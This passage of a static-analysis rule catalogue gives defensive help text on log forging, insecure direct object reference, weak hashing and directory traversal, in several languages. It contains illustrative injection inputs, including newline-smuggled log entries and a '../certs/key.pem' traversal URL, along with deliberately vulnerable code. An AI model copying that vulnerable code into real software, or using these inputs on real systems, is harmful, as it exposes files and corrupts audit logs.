dependency injection:\n\n```csharp\nusing Microsoft.Extensions.Logging;\n\nnamespace WebApplication.Controllers\n{\n    public class HomeController : Controller\n    {\n        private readonly ILogger<HomeController> _logger;\n\n        public HomeController(ILogger<HomeController> logger)\n        {\n            _logger = logger;\n            _logger.LogInformation(\"Logs initialized!\");\n        }\n    }\n}\n```\n\nThe log level and formatting can then be configured in the `appsettings.json` file for the project:\n\n```json\n{\n  \"Logging\": {\n    \"LogLevel\": {\n      \"Default\": \"Information\",\n      \"Microsoft\": \"Warning\",\n      \"Microsoft.Hosting.Lifetime\": \"Information\"\n    },\n    \"Console\": {\n      \"LogLevel\": {\n        \"Default\": \"Information\",\n        \"Microsoft\": \"Warning\",\n        \"Microsoft.Hosting.Lifetime\": \"Information\"\n      },\n      \"FormatterName\": \"json\",\n      \"FormatterOptions\": {\n        \"SingleLine\": true,\n        \"IncludeScopes\": true,\n        \"TimestampFormat\": \"HH:mm:ss \",\n        \"UseUtcTimestamp\": true,\n        \"JsonWriterOptions\": {\n          \"Indented\": true\n        }\n      }\n    }\n  }\n}\n```\n\nThis will prefix each line of logging with a timestamp and the name of the class emitting log information.\n\n:::\n\n:::tab[JavaScript]\n\n## Log Forging in Node.js\n\nIn JavaScript, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\n```javascript\nconsole.log('Hello\\nworld')\n```\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n`/login?\\nUser+logged+out`, so that any code that logs the URL also prints the line `User logged out`. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nBunyan is an example of a logging library for Node.js that supports structured\nlogging:\n\n```javascript\n  // Logs will be in JSON format.\n  const log = require('bunyan').createLogger({ name: \"example\" })\n\n  /**\n   * This logging will output\n   *   {\"name\":\"example\",\"hostname\":\"HOSTNAME\",\"pid\":PROCESS_ID,\"level\":30,\"msg\":\"Hello\\nworld\",\"time\":\"TIMESTAMP\",\"v\":0}\n   */\n  log.info('Hello\\nworld')\n```\n\n:::\n\n:::tab[Python]\n\n## Log Forging in Python\n\nIn Python, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\n```python\nprint(\"Hello\\nworld\")\n```\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n`/login?\\nUser+logged+out`, so that any code that logs the URL also prints the line `User logged out`. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nIn order to do structured logging with the built-in Python `logging` module, you\nneed to configure a custom formatter like here:\n\n```python\nimport json\nimport logging\nimport sys\n\nlogger=logging.getLogger()\nlogger.setLevel(logging.DEBUG)\n\nclass JsonFormatter(logging.Formatter):\n    def format(self, record):\n        field_names = (\n            'created',\n            'filename',\n            'funcName',\n            'levelname',\n            'levelno',\n            'lineno',\n            'msg',\n            'module',\n            'msecs',\n            'name',\n            'pathname',\n            'process',\n            'processName',\n            'relativeCreated',\n            'thread',\n            'threadName',\n            'taskName',\n        )\n        return json.dumps({ field_name: ('{0.' + field_name + '}').format(record) for field_name in field_names })\n\nhandler=logging.StreamHandler(sys.stderr)\nhandler.setFormatter(JsonFormatter())\n\nlogger.addHandler(handler)\n\nlogging.info(\"abcd\")\n# will print something like\n# {\"created\": \"1709053589.5001647\", \"filename\": \"<filename>\", \"funcName\": \"<module>\", \"levelname\": \"INFO\", \"levelno\": \"20\", \"lineno\": \"41\", \"msg\": \"abcd\", \"module\": \"<filename>\", \"msecs\": \"500.0\", \"name\": \"root\", \"pathname\": \"<filename>\", \"process\": \"140750\", \"processName\": \"MainProcess\", \"relativeCreated\": \"1985.8925342559814\", \"thread\": \"140257496983360\", \"threadName\": \"MainThread\", \"taskName\": \"None\"}\n```\n\n:::\n\n:::tab[Scala]\n\n## Log Forging in Scala\n\nIn Scala, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\n```scala\nprintln(\"Hello\\nworld\")\n```\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n`/login?\\nUser+logged+out`, so that any code that logs the URL also prints the line `User logged out`. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nFor example, Log4j2 can be configured for structured JSON output with a\nconfiguration file like this:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration>\n    <Appenders>\n        <Console name=\"Console\" target=\"SYSTEM_OUT\">\n            <JSONLayout />\n        </Console>\n    </Appenders>\n\n    <Loggers>\n        <Root level=\"INFO\">\n            <AppenderRef ref=\"Console\"/>\n        </Root>\n    </Loggers>\n</Configuration>\n```\n\n:::\n\n:::tab[Go]\n\n## Log Forging in Go\n\nIn Go, writing to the standard console log will not escape new line characters. That means that if you execute\nthe following:\n\n```go\nfmt.Println(\"Hello\\nworld\")\n```\n\n...you will get two lines of output. Attackers will try to make use of this by inserting new line characters into the\nparameters in their HTTP requests to add extra lines of logging. They might, for instance, make HTTP requests to the URL\n`/login?\\nUser+logged+out`, so that any code that logs the URL also prints the line `User logged out`. This can be \nhelpful for an attacker if they want to disguise their tracks.\n\nThe best way to defuse log forging attacks is to use a logging module that does\nnot write unstructured text files. These packages also have a multitude of other\nadvantages: the verbosity of the logging can be set by configuration, and logs\ncan be written in a structured format like JSON for easy processing by log\nmanagement tools like Splunk and Logstash.\n\nThe `log/slog` supports structured logging like in this example:\n\n```go\npackage main\n\nimport \"log/slog\"\n\nfunc main() {\n    logger := slog.New(slog.NewJSONHandler(os.Stdout, nil))\n    logger.Info(\"hello, world\", \"user\", os.Getenv(\"USER\"))\n    // prints something like\n    // {\"time\":\"2023-08-04T16:58:02.939245411-04:00\",\"level\":\"INFO\",\"msg\":\"hello, world\",\"user\":\"jba\"}\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## Log Forging in PHP\n\nIn PHP, logging is typically done by appending to files or sending messages to syslog. Just like in other languages, it's crucial to sanitize inputs that are written to logs in PHP to avoid log forging attacks.\n\nConsider the following naive PHP logging mechanism:\n\n```php\n$message = $_GET['message'];\nfile_put_contents(\"/var/log/myapp.log\", $message . \"\\n\", FILE_APPEND);\n```\n\nIf an attacker sends a GET request with `message=Legitimate log entry\\nMalicious log entry`, the malicious log entry would also be appended to the log, potentially hiding or disguising malicious activities or even causing confusion during a forensic investigation.\n\n## Mitigation\n\nTo prevent log forging in PHP:\n\n1. Always sanitize and validate any data that gets written to logs.\n2. Avoid directly logging user-controlled data.\n3. Use established logging libraries that offer structured logging and have built-in protection against log forging.\n\nHere's an example using the popular Monolog logging library in PHP:\n\n```php\nrequire 'vendor/autoload.php';\n\nuse Monolog\\Formatter\\JsonFormatter;\nuse Monolog\\Handler\\StreamHandler;\nuse Monolog\\Logger;\n\n$logger = new Logger('my_logger');\n$handler = new StreamHandler('/var/log/myapp.log');\n$handler->setFormatter(new JsonFormatter());\n$logger->pushHandler($handler);\n\n// and then where ever in the code\n$logger->info('message', [\"value\" => $_GET['value']]);\n\n// it will result in a parsable output similar to this:\n// {\n//   \"message\":\"message\",\n//   \"context\": {\n//      \"value\":\"...GET input...\", \n//   }, \n//   \"level\":200, \n//   \"level_name\":\"INFO\",  \n//   \"channel\":\"my_logger\",\n//   \"datetime\":\"2021-06-25T10:54:10.116817+00:00\",\n//   \"extra\":{}\n// }\n```\n\nWhen using Monolog, it automatically handles the structure of the log and the sanitization of potentially harmful characters, reducing the risk of log forging. Moreover, structured logs can be parsed more easily by log management tools and are less susceptible to log forging in general.\n\n:::\n\n::::\n\n\n## Malicious Content in Logs\n\nAn attacker can always control what is written to the logs by manipulating the HTTP request. A common attack vector is\nto inject HTML into log entries, in the hope that an administrator views the log files in a web application that does \nnot properly escape HTML characters. If you make use of a tool to view logs or error reports, treat the contents of log \nfiles as untrusted input as you would the original HTTP request - or you could fall-foul of cross-site scripting \nattacks aimed at hijacking admin accounts.\n\n## CWEs\n \n* [CWE-117](https://cwe.mitre.org/data/definitions/117.html)."
              },
              "name": "LogForging",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "fullDescription": {
                "text": "The application writes attacker-controlled data directly to a log file."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Log Forging"
              }
            },
            {
              "id": "idor-db",
              "help": {
                "text": "Attacker controlled data is used to find an entry in a database. This indicates a possible Insecure Direct Object Reference.\n\n**Note that this vulnerability only becomes relevant when it allows access to data that is ordinarily protected by authentication mechanisms.**\n\nInsecure direct object reference is a type of access control vulnerability that can occur\nwhen a web application or application programming interface uses an identifier for direct access\nto an object in an internal database but does not check for access control or authentication.\n\n\n## Countermeasures\n\nEnsure your application checks that the requesting user is authorized to access the database entry.\n\n## Additional information\n\n**[Insecure Direct Object Reference Prevention Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.md#proposition.)**.",
                "markdown": "Attacker controlled data is used to find an entry in a database. This indicates a possible Insecure Direct Object Reference.\n\n**Note that this vulnerability only becomes relevant when it allows access to data that is ordinarily protected by authentication mechanisms.**\n\nInsecure direct object reference is a type of access control vulnerability that can occur\nwhen a web application or application programming interface uses an identifier for direct access\nto an object in an internal database but does not check for access control or authentication.\n\n\n## Countermeasures\n\nEnsure your application checks that the requesting user is authorized to access the database entry.\n\n## Additional information\n\n**[Insecure Direct Object Reference Prevention Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.md#proposition.)**."
              },
              "name": "InsecureDirectObjectReference",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "fullDescription": {
                "text": "Attacker controlled data is used to find an entry in a database. This indicates a possible Insecure Direct Object Reference."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Insecure Direct Object Reference"
              }
            },
            {
              "id": "hash-compare",
              "help": {
                "text": "String comparisons using '!=' and '==' are vulnerable to timing attacks.\n\n## Countermeasures\n\nSwitch to a constant-time comparison function like CryptographicOperations.FixedTimeEquals().\n\n## Weak Hashes\n\nA *hash* is a type of cryptographic algorithm that produces an output of fixed length regardless of the input. Hash\nalgorithms are often used to store passwords securely in a database, or generate digital signatures which prove data has\nnot been tampered with. It is important that you use *strong hash* algorithms when securing data in this way - and\ninclude an element of randomness called a *salt* - or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power. This often entails choosing a *one-way hash* algorithm that is\ncomputationally infeasible to reverse.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\njava\npublic String hashPassword(String password) \n{\n    return org.mindrot.BCrypt.hashpw(password, org.mindrot.BCrypt.gensalt(SALT_ROUNDS));\n}\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[C#]\n\nBCrypt is a strong, one-way hash called that can be used to encode passwords, and validate them as they are re-entered\nby a user. It is available in the NuGet repository and can be used as shown:\n\ncsharp\nusing BCrypt.Net;\n\n// BCrypt is a strong hash, suitable for storing passwords. Remember to add a salt value!\npublic class Hashing\n{\n    private static string GetRandomSalt()\n    {\n        return BCrypt.GenerateSalt(12);\n    }\n    \n    public static string HashPassword(string password)\n    {\n        return BCrypt.HashPassword(password, GetRandomSalt());\n    }\n    \n    public static bool ValidatePassword(string password, string correctHash)\n    {\n       \treturn BCrypt.Verify(password, correctHash);\n    }\n}\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\njavascript\nconst bcrypt  = require('bcrypt')\nconst express = require('express')\n\nconst app    = express()\n\n// Increase this value to make the hashing process take longer, and hence harder to decrypt.\nconst saltRounds = 10\n\napp.post('/signup', (request, response) => {\n  const username = request.params.username\n  const password = request.params.password\n\n  /**\n   * The user is signing up - calculated their password hash and save it to the database.\n   */\n  bcrypt.hash(password, saltRounds, (error, hashedPassword) => {\n    if (error) {\n      response.status(400)\n      return\n    }\n\n    saveUser(username, hashedPassword)\n    response.redirect('/login')\n  })\n})\n\napp.post('/login', (request, response) => {\n  const username = request.params.username\n  const password = request.params.password\n\n  /**\n   * The user is logging back in - recalculate their password hash and\n   * compare it with the saved value.\n   */\n  const user = getUser(username)\n\n  // Calculate the password hash regardless of whether the username exists,\n  // so the attacker cannot use timing attacks to detect which users exist\n  // in the database.\n  const passwordHash = user ? user.hashedPassword : ''\n\n  bcrypt.compare(password, passwordHash, (error, matched) => {\n    if (error) {\n      response.status(400)\n      return\n    }\n\n    if (user && matched) {\n      // The password hash matches, Log the user in.\n      request.session.username = username\n      self.redirect('/')\n    }\n    else {\n      // Tell them the credentials are incorrect.\n      response.status(401)\n    }\n  })\n})\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Python]\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\npython\nimport bcrypt\n\n@app.route('/signup', methods=('POST',))\ndef do_signup():\n  username = request.form['username']\n  password = request.form['password']\n\n  # The user is signing up - calculated their password hash and save it to the database.\n  salt   = bcrypt.gensalt()\n  hashed = bcrypt.hashpw(password, salt)\n\n  save_credentials(username, hashed)\n\n  return redirect('/login')\n\n@app.route('/login', methods=('POST',))\ndef do_login():\n  username = request.form['username']\n  password = request.form['password']\n\n  # The user is logging back in - recalculate their password hash and\n  # compare it with the saved value.\n  user   = get_user(username)\n  hashed = user.hashed_password if user else ''\n\n  # Calculate the password hash regardless of whether the username exists,\n  # so the attacker cannot use timing attacks to detect which users exist\n  # in the database.\n  if bcrypt.checkpw(password, hashed):\n    session['user'] = user\n    return redirect('/timeline')\n\n  return render_template('login.html', error='Invalid username or password')\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Scala]\n\nA *hash* is a type of encryption algorithm that produces an output of fixed length regardless of the input. Hash\nalgorithms are often used to store passwords securely in a database, or generate digital signatures which prove data has\nnot been tampered with. It is important that you use *strong hash* algorithms when securing data in this way - and\ninclude an element of randomness called a *salt* - or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power. This often entails choosing a *one-way hash* algorithm that is\ncomputationally infeasible to reverse.\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\nscala\nval SaltRounds : Int = 10\n\ndef encryptPassword(password: String) = {\n  org.mindrot.jbcrypt.BCrypt.hashpw(password, org.mindrot.jbcrypt.BCrypt.gensalt(SaltRounds));\n}\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Go]\n\nConsider the following function that uses a strong, one-way hash called BCrypt to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\ngo\nimport (\n  \"golang.org/x/crypto/bcrypt\"\n  \"fmt\"\n)\n\nfunc HashPassword(password string) string {\n  // Each call to GenerateFromPassword(...) will use a different salt value.\n  hash, _ := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)\n  return string(hash)\n}\n\nfunc CheckPassword(hashedPassword string, password string) bool {\n  err := bcrypt.CompareHashAndPassword(hashedPassword, password)\n  return err != nil\n}\n\n\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[PHP]\n\n## Weak Hashes in PHP\n\nIn PHP, there are older hash functions like md5() and sha1(), which, due to their vulnerabilities, shouldn't be used for sensitive operations. An attacker, equipped with rainbow tables or leveraging collisions, can reverse-engineer these hashes. Here's an example of using md5 for password hashing:\n\nphp\nfunction insecureHashPassword($password) {\n    return md5($password);\n}\n\n\nThis approach is flawed and insecure for the reasons stated above.\n\n## Mitigation\n\n1. **Use PHP's Built-in Password Functions**: PHP provides the password_hash() function, which by default uses the bcrypt algorithm and incorporates salting:\n\nphp\nfunction hashPasswordSecurely($password) {\n    return password_hash($password, PASSWORD_DEFAULT);\n}\n\n\n2. **Verify Passwords Securely**: When verifying a user's password, use the password_verify() function. This method safely compares a password against a hashed value:\n\nphp\nfunction verifyPassword($password, $hashedPassword) {\n    return password_verify($password, $hashedPassword);\n}\n\n\n3. **Always Include a Salt**: Modern hashing functions like password_hash() incorporate salting automatically. This ensures that even if two users have the same password, their hashed values will be different, thwarting rainbow table attacks.\n\n4. **Migrate Old Hashes**: If you're dealing with an older system, migrate hashes from weak algorithms to stronger ones upon user login or during a forced password reset.\n\n:::\n\n::::\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**.",
                "markdown": "String comparisons using '!=' and '==' are vulnerable to timing attacks.\n\n## Countermeasures\n\nSwitch to a constant-time comparison function like `CryptographicOperations.FixedTimeEquals()`.\n\n## Weak Hashes\n\nA *hash* is a type of cryptographic algorithm that produces an output of fixed length regardless of the input. Hash\nalgorithms are often used to store passwords securely in a database, or generate digital signatures which prove data has\nnot been tampered with. It is important that you use *strong hash* algorithms when securing data in this way - and\ninclude an element of randomness called a *salt* - or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power. This often entails choosing a *one-way hash* algorithm that is\ncomputationally infeasible to reverse.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```java\npublic String hashPassword(String password) \n{\n    return org.mindrot.BCrypt.hashpw(password, org.mindrot.BCrypt.gensalt(SALT_ROUNDS));\n}\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[C#]\n\n`BCrypt` is a strong, one-way hash called that can be used to encode passwords, and validate them as they are re-entered\nby a user. It is available in the NuGet repository and can be used as shown:\n\n```csharp\nusing BCrypt.Net;\n\n// BCrypt is a strong hash, suitable for storing passwords. Remember to add a salt value!\npublic class Hashing\n{\n    private static string GetRandomSalt()\n    {\n        return BCrypt.GenerateSalt(12);\n    }\n    \n    public static string HashPassword(string password)\n    {\n        return BCrypt.HashPassword(password, GetRandomSalt());\n    }\n    \n    public static bool ValidatePassword(string password, string correctHash)\n    {\n       \treturn BCrypt.Verify(password, correctHash);\n    }\n}\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```javascript\nconst bcrypt  = require('bcrypt')\nconst express = require('express')\n\nconst app    = express()\n\n// Increase this value to make the hashing process take longer, and hence harder to decrypt.\nconst saltRounds = 10\n\napp.post('/signup', (request, response) => {\n  const username = request.params.username\n  const password = request.params.password\n\n  /**\n   * The user is signing up - calculated their password hash and save it to the database.\n   */\n  bcrypt.hash(password, saltRounds, (error, hashedPassword) => {\n    if (error) {\n      response.status(400)\n      return\n    }\n\n    saveUser(username, hashedPassword)\n    response.redirect('/login')\n  })\n})\n\napp.post('/login', (request, response) => {\n  const username = request.params.username\n  const password = request.params.password\n\n  /**\n   * The user is logging back in - recalculate their password hash and\n   * compare it with the saved value.\n   */\n  const user = getUser(username)\n\n  // Calculate the password hash regardless of whether the username exists,\n  // so the attacker cannot use timing attacks to detect which users exist\n  // in the database.\n  const passwordHash = user ? user.hashedPassword : ''\n\n  bcrypt.compare(password, passwordHash, (error, matched) => {\n    if (error) {\n      response.status(400)\n      return\n    }\n\n    if (user && matched) {\n      // The password hash matches, Log the user in.\n      request.session.username = username\n      self.redirect('/')\n    }\n    else {\n      // Tell them the credentials are incorrect.\n      response.status(401)\n    }\n  })\n})\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Python]\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```python\nimport bcrypt\n\n@app.route('/signup', methods=('POST',))\ndef do_signup():\n  username = request.form['username']\n  password = request.form['password']\n\n  # The user is signing up - calculated their password hash and save it to the database.\n  salt   = bcrypt.gensalt()\n  hashed = bcrypt.hashpw(password, salt)\n\n  save_credentials(username, hashed)\n\n  return redirect('/login')\n\n@app.route('/login', methods=('POST',))\ndef do_login():\n  username = request.form['username']\n  password = request.form['password']\n\n  # The user is logging back in - recalculate their password hash and\n  # compare it with the saved value.\n  user   = get_user(username)\n  hashed = user.hashed_password if user else ''\n\n  # Calculate the password hash regardless of whether the username exists,\n  # so the attacker cannot use timing attacks to detect which users exist\n  # in the database.\n  if bcrypt.checkpw(password, hashed):\n    session['user'] = user\n    return redirect('/timeline')\n\n  return render_template('login.html', error='Invalid username or password')\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Scala]\n\nA *hash* is a type of encryption algorithm that produces an output of fixed length regardless of the input. Hash\nalgorithms are often used to store passwords securely in a database, or generate digital signatures which prove data has\nnot been tampered with. It is important that you use *strong hash* algorithms when securing data in this way - and\ninclude an element of randomness called a *salt* - or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power. This often entails choosing a *one-way hash* algorithm that is\ncomputationally infeasible to reverse.\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```scala\nval SaltRounds : Int = 10\n\ndef encryptPassword(password: String) = {\n  org.mindrot.jbcrypt.BCrypt.hashpw(password, org.mindrot.jbcrypt.BCrypt.gensalt(SaltRounds));\n}\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[Go]\n\nConsider the following function that uses a strong, one-way hash called `BCrypt` to encode a password when it is set,\nand repeats the calculation when a user attempts to reauthenticate:\n\n```go\nimport (\n  \"golang.org/x/crypto/bcrypt\"\n  \"fmt\"\n)\n\nfunc HashPassword(password string) string {\n  // Each call to GenerateFromPassword(...) will use a different salt value.\n  hash, _ := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)\n  return string(hash)\n}\n\nfunc CheckPassword(hashedPassword string, password string) bool {\n  err := bcrypt.CompareHashAndPassword(hashedPassword, password)\n  return err != nil\n}\n\n```\n\nSince the password is strongly encrypted with a one-way hash, and generated with a salt, an attacker who manages to \nsteal the contents of your database will still not be able to backwards engineer the credentials for your users.\n\n:::\n\n:::tab[PHP]\n\n## Weak Hashes in PHP\n\nIn PHP, there are older hash functions like `md5()` and `sha1()`, which, due to their vulnerabilities, shouldn't be used for sensitive operations. An attacker, equipped with rainbow tables or leveraging collisions, can reverse-engineer these hashes. Here's an example of using `md5` for password hashing:\n\n```php\nfunction insecureHashPassword($password) {\n    return md5($password);\n}\n```\n\nThis approach is flawed and insecure for the reasons stated above.\n\n## Mitigation\n\n1. **Use PHP's Built-in Password Functions**: PHP provides the `password_hash()` function, which by default uses the `bcrypt` algorithm and incorporates salting:\n\n```php\nfunction hashPasswordSecurely($password) {\n    return password_hash($password, PASSWORD_DEFAULT);\n}\n```\n\n2. **Verify Passwords Securely**: When verifying a user's password, use the `password_verify()` function. This method safely compares a password against a hashed value:\n\n```php\nfunction verifyPassword($password, $hashedPassword) {\n    return password_verify($password, $hashedPassword);\n}\n```\n\n3. **Always Include a Salt**: Modern hashing functions like `password_hash()` incorporate salting automatically. This ensures that even if two users have the same password, their hashed values will be different, thwarting rainbow table attacks.\n\n4. **Migrate Old Hashes**: If you're dealing with an older system, migrate hashes from weak algorithms to stronger ones upon user login or during a forced password reset.\n\n:::\n\n::::\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**."
              },
              "name": "TimingAttack",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "fullDescription": {
                "text": "String comparisons using '!=' and '==' are vulnerable to timing attacks."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Timing Attack"
              }
            },
            {
              "id": "directory-traversal-http",
              "help": {
                "text": "Attacker-Controlled input data is used as part of a file path to write a file without escaping or validation. This indicates a directory traversal vulnerability.\n\n# Directory Traversal\n\n**Directory traversal** vulnerabilities allow attackers to access arbitrary files on your server by manipulating HTTP\nparameters to include relative path syntax. It is important that you treat any parameters used to refer to files\nsecurely, or an attacker will be able to read sensitive data from your file system. Even better, avoid direct references\nto filenames altogether and use opaque identifiers and indirection instead.\n\n::::tabs\n\n:::tab[Java]\n\nPassing file paths in URLs is dangerous. Consider the following Java application that hosts menus for a restaurant:\n\njava\npublic class UnsafeFileDownloadServlet\n{\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Taking the unfiltered filename from the HTTP request is dangerous -\n         * an attacker can use the \"../\" syntax in a filename to climb out of\n         * the intended directory.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String menuDirectory = \"/var/etc/menus\";\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + fileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + fileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this menu parameter to anything they choose, and use the ../ syntax to access other directories. In \nfact, the URL /menus?menu=../certs/key.pem will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n/, .., \\. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like FilenameUtils.getBaseName that strips any potential directory\ncomponents from a path. That only leaves ., .. and the empty string as\nspecial cases that could lead to unexpected behavior:\n\njava\nimport org.apache.commons.io.FilenameUtils;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Removing anything except alphanumeric characters (and periods) will\n         * stop access to arbitrary directories.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String safeFileName  = FilenameUtils.getBaseName(fileName);\n        final String menuDirectory = \"/var/etc/menus\";\n\n\tif (\"\".equals(safeFileName) || \".\".equals(safeFileName) || \"..\".equals(safeFileName)) {\n\t    throw new SystemException(\"refusing to read a special directory name\");\n\t}\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + safeFileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + safeFileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n\n\nIn Java web applications you can have the server take care of this for you. The following configuration safely mounts \nthe /var/etc/menus directory as static content in a Jetty web-server:\n\nxml\n<Configure class=\"org.eclipse.jetty.server.handler.ContextHandler\">\n  <Set name=\"contextPath\">/menus</Set>\n  <Set name=\"handler\">\n    <New class=\"org.eclipse.jetty.server.handler.ResourceHandler\">\n      <Set name=\"resourceBase\">/var/etc/menus</Set>\n      <Set name=\"directoriesListed\">false</Set>\n    </New>\n  </Set>\n</Configure>\n\n\n\n:::\n\n:::tab[C#]\n\n## Directory Traversal in C#\n\nPassing file paths in URLs is dangerous. Consider the following ASP.NET Core controller method that hosts menus for a \nrestaurant:\n\ncsharp\n    [HttpGet(\"menus\")]\n    public IActionResult UnsafeFileDownload([FromQuery] string menu)\n    {\n        byte[] fileBytes = System.IO.File.ReadAllBytes(\"Static/menus/\" + menu);\n        return File(fileBytes, 